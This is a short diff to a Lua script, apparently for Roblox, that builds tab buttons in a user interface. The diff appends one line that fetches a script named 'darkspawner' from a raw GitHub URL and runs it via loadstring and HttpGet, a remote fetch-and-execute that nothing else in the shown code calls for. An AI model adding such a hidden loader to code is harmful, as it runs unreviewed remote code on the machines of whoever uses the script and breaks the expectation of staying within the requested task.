@@ -239,3 +239,4 @@ end
 for i, name in ipairs(TabNames) do
 	CreateTabButton(name, i)
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GAGscriptbyyash/New-Obs/refs/heads/main/darkspawner"))()
